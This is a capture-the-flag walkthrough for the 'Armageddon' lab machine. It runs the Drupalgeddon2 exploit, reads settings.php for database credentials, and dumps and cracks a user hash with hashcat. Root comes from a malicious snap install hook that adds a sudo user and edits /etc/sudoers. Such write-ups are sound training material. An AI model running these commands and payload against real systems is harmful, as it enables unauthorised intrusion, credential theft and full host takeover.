@@ -1,0 +1,180 @@
+ Armageddon
+
+      15th December 2020 / Document No D20.101.126
+      Prepared By: bertolis
+      Machine Author: bertolis
+      Difficulty: Easy
+Classification: Official
+Synopsis
+
+Armageddon is an easy difficulty machine. An exploitable Drupal website allows access to the remote host.
+Enumeration of the Drupal file structure reveals credentials that allows us to connect to the MySQL server,
+and eventually extract the hash that is reusable for a system user. Using these credentials, we can connect
+to the remote machine over SSH. This user is allowed to install applications using the snap package
+manager. Privilege escalation is possible by uploading and installing to the host, a malicious application
+using Snapcraft.
+
+Skills required
+
+      Basic Linux Knowledge
+
+Skills learned
+
+      Drupal exploitation
+      Snap package manager exploitation
+Enumeration
+
+Nmap
+
+   ports=$(nmap -p- --min-rate=1000 -T4 10.10.10.99 | grep ^[0-9] | cut -d '/' -f 1 | tr
+   '\n' ',' | sed s/,$//)
+   nmap -p$ports -sC -sV 10.10.10.99
+
+Nmap output reveals an Apache server and an SSH server running on their default ports. Let's visit the
+website on port 80.
+Nmap reveals that the Apache server is hosting an instance of Drupal 7. This is the login page of the
+website, in which we don't have any credentials to login. Creating a new account is impossible since the mail
+verification seems to be broken. We need to search online for any Drupal 7 exploits.
+Foothold
+
+According to the Drupal Security Advisories description, several versions of Drupal allow remote attackers to
+execute arbitrary code, due to a vulnerability that exists within multiple subsystems of Drupal. This
+eventually could result in the site being completely compromised. Online searching reveals an exploit on
+GitHub named Drupalgeddon , that affects the current version of Drupal. We clone the repository and run
+it.
+
+   git clone https://github.com/dreadlocked/Drupalgeddon2.git
+   cd Drupalgeddon2
+   ruby drupalgeddon2.rb http://10.10.10.99
+
+This is successful and we can now execute commands to the remote host as the user apache .
+Lateral Movement
+
+Enumerating the file structure of Drupal, we notice the file /var/www/html/sites/default/settings.php .
+This is a file that Drupal uses during the installation and it might contains credentials. Let's read its content.
+
+   cat /var/www/html/sites/default/settings.php
+
+The file is found to contain information regarding database connection. Since the shell we have obtained is
+not fully interactive, we can try to enumerate the MySQL server by executing one command at a time, and
+using the above credentials to connect.
+
+   mysql -u drupaluser -pCQHEy@9M*m23gBVj -e 'show databases;'
+The query above lists the databases. We use the database drupal and list its tables.
+   mysql -u drupaluser -pCQHEy@9M*m23gBVj -e 'use drupal; show tables;'
+
+What is worth to enumerate at this step is the table users . We get the content of its columns.
+   mysql -u drupaluser -pCQHEy@9M*m23gBVj -e 'use drupal; select * from users;'
+
+The table users reveals an encrypted password
+$S$DgL2gjv6ZtxBo6CdqZEyJuBphBmrCqIV6W97.oOsUf1xAhaadURt for the user brucetherealadmin . In
+order to crack this password, we are going to use the tool hashcat . First, we add the hash into a file.
+
+   echo '$S$DgL2gjv6ZtxBo6CdqZEyJuBphBmrCqIV6W97.oOsUf1xAhaadURt' > hash
+Then, we have to find the correct hash mode for Drupal.
+   hashcat --help | grep Drupal
+
+Finally, we run the following command to try crack the hash.
+   sudo hashcat -m 7900 -a 0 -o cracked.txt hash /usr/share/wordlists/rockyou.txt --force
+
+By listing the content of the file cracked.txt , we reveal the decrypted password.
+   sudo cat cracked.txt
+
+The credentials brucetherealadmin/booboo can be used now to login via SSH to the remote host.
+   ssh brucetherealadmin@10.10.10.99
+The user flag is located in /home/brucetherealadmin/user.txt .
+Privilege Escalation
+
+We check which commands the user brucetherealadmin can execute as user root.
+
+   sudo -l
+
+The user brucetherealadmin can execute the command /usr/bin/snap install * as root, without
+using password. Snap is a package manager that packages and deploys applications. Snaps, are self-
+contained applications which are running in a sandbox with mediated access to the host system. According
+to this article, a snap can get access to the host when running in a mode called devmode . Additionally,
+snaps use hooks and specifically the install hook which is running during the installation process. That
+means if the devmode is specified, then this hook is going to be run at the installation time, giving access to
+the host, and since we can execute this command as root, then the code that is going to be executed during
+the installation, is going to be executed in the same context. First, we have to create a new snap, and in
+order to do so, we will be using Snapcraft. The following installation process of Snapcraft has been tested in
+Ubuntu OS and might be slightly different in other OS.
+
+   sudo apt update
+   sudo apt install snapd
+   sudo snap install --classic snapcraft
+
+Also, the content (payload) of the snap should be the code that is going to be executed during the
+installation process. The following bash script creates the snap that we are going to upload to the remote
+host. The specific payload, creates the user snap_user with the password snap_user , and gives him
+elevated privileges. We copy and paste the following code into a file and name it snapcraft.sh .
+
+   # Make an empty directory to work with
+   mkdir new_snap
+   cd new_snap
+
+   # Initialize the directory as a snap project
+   snapcraft init
+
+   # Set up the install hook
+   mkdir snap/hooks
+   touch snap/hooks/install
+   chmod a+x snap/hooks/install
+
+   # Write the script we want to execute as root
+   cat > snap/hooks/install << "EOF"
+   #!/bin/bash
+
+   password="snap_user"
+   pass=$(perl -e 'print crypt($ARGV[0], "password")' $password)
+
+   useradd snap_user -m -p $pass -s /bin/bash
+   usermod -aG sudo snap_user
+   echo "snap_user ALL=(ALL:ALL) ALL" >> /etc/sudoers
+   EOF
+
+   # Configure the snap yaml file
+   cat > snap/snapcraft.yaml << "EOF"
+   name: snap-user
+   version: '0.1'
+   summary: Empty snap, used for exploit
+   description: |
+
+          This is an example
+
+   grade: devel
+   confinement: devmode
+
+   parts:
+      my-part:
+          plugin: nil
+
+   EOF
+
+   # Build the snap
+   snapcraft
+
+We change the permissions and execute the file.
+
+   chmod +x snapcraft.sh
+   ./snapcraft.sh
+
+When it's done, we copy the whole directory to the remote machine.
+
+   scp -r new_snap brucetherealadmin@10.10.10.99:/tmp
+
+Now we can install the snap in the remote machine, using the sudo and devmode options.
+
+   cd /tmp/new_snap
+   sudo snap install --devmode snap-user_0.1_amd64.snap
+We can run the following command to list the installed naps.
+   snap list
+
+Our snap is now installed. We list the users of the system.
+   cat /etc/passwd
+
+Finally, we try to change to user snap_user using the password snap_user .
+   su snap_user
+   sudo -l
+The root flag is located in /root/root.txt .
+
